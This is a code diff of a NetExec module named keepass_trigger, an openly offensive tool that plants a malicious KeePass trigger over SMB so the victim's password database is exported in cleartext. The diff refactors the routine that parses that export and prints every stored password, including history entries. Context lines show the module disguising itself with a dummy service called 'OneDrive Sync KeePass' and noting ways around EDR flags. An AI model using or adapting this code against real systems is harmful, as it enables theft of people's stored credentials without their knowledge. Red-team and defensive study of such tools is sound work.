@@ -1,13 +1,13 @@
 import os
 import sys
-import json
-from xmltodict import parse
 from time import sleep
 from csv import reader
 from base64 import b64encode
 from io import BytesIO, StringIO
-from xml.etree import ElementTree
+from xml.etree import ElementTree as ET
+from nxc.helpers.misc import CATEGORY
 from nxc.helpers.powershell import get_ps_script
+from nxc.paths import TMP_PATH
 
 
 class NXCModule:
@@ -22,11 +22,10 @@ class NXCModule:
     name = "keepass_trigger"
     description = "Set up a malicious KeePass trigger to export the database in cleartext."
     supported_protocols = ["smb"]
+    category = CATEGORY.CREDENTIAL_DUMPING
     # while the module only executes legit powershell commands on the target (search and edit files)
     # some EDR like Trend Micro flag base64-encoded powershell as malicious
     # the option PSH_EXEC_METHOD can be used to avoid such execution, and will drop scripts on the target
-    opsec_safe = False
-    multiple_hosts = False
 
     def __init__(self):
         # module options
@@ -41,7 +40,7 @@ class NXCModule:
         self.share = "C$"
         self.remote_temp_script_path = "C:\\Windows\\Temp\\temp.ps1"
         self.keepass_binary_path = "C:\\Program Files\\KeePass Password Safe 2\\KeePass.exe"
-        self.local_export_path = "/tmp"
+        self.local_export_path = TMP_PATH
         self.trigger_name = "export_database"
         self.poll_frequency_seconds = 5
         self.dummy_service_name = "OneDrive Sync KeePass"
@@ -360,7 +359,7 @@ class NXCModule:
             sys.exit(1)
 
         try:
-            keepass_config_xml_root = ElementTree.fromstring(buffer.getvalue())
+            keepass_config_xml_root = ET.fromstring(buffer.getvalue())
         except Exception as e:
             context.log.fail(f"Error while parsing file '{self.keepass_config_path}', exiting: {e}")
             sys.exit(1)
@@ -379,30 +378,32 @@ class NXCModule:
 
     def extract_password(self, context):
         xml_doc_path = os.path.abspath(self.local_export_path + "/" + self.export_name)
-        xml_tree = ElementTree.parse(xml_doc_path)
+        xml_tree = ET.parse(xml_doc_path)
         root = xml_tree.getroot()
-        to_string = ElementTree.tostring(root, encoding="UTF-8", method="xml")
-        xml_to_dict = parse(to_string)
-        dump = json.dumps(xml_to_dict)
-        obj = json.loads(dump)
 
-        if len(obj["KeePassFile"]["Root"]["Group"]["Entry"]):
-            for obj2 in obj["KeePassFile"]["Root"]["Group"]["Entry"]:
-                for password in obj2["String"]:
-                    if password["Key"] == "Password":
-                        context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]["#text"]))
-                    else:
-                        context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]))
-                context.log.highlight("")
-        if len(obj["KeePassFile"]["Root"]["Group"]["Group"]):
-            for obj2 in obj["KeePassFile"]["Root"]["Group"]["Group"]:
-                try:
-                    for obj3 in obj2["Entry"]:
-                        for password in obj3["String"]:
-                            if password["Key"] == "Password":
-                                context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]["#text"]))
-                            else:
-                                context.log.highlight(str(password["Key"]) + " : " + str(password["Value"]))
-                        context.log.highlight("")
-                except KeyError:
-                    pass
+        root_entries = root.find("./Root/Entry")
+        if root_entries is not None:
+            for entry in root_entries:
+                if entry is not None:
+                    self.print_password(context, entry)
+                else:
+                    context.log.highlight("None")
+
+        objects = root.findall("./Root/Group")
+        while objects:
+            current_object = objects.pop(0)
+            for entry in current_object.findall("./Entry"):
+                self.print_password(context, entry)
+                for history in entry.findall("./History"):
+                    for history_entry in history.findall("./Entry"):
+                        self.print_password(context, history_entry)
+            objects.extend(current_object.findall("./Group"))
+
+    def print_password(self, context, entries):
+        for entry in entries.findall("./String"):
+            key = entry.find("./Key")
+            value = entry.find("./Value")
+            key_text = key.text if key is not None else "None"
+            value_text = value.text if value is not None and value.text is not None else "None"
+            context.log.highlight(f"{key_text} : {value_text}")
+        context.log.highlight("-------------------------------------")
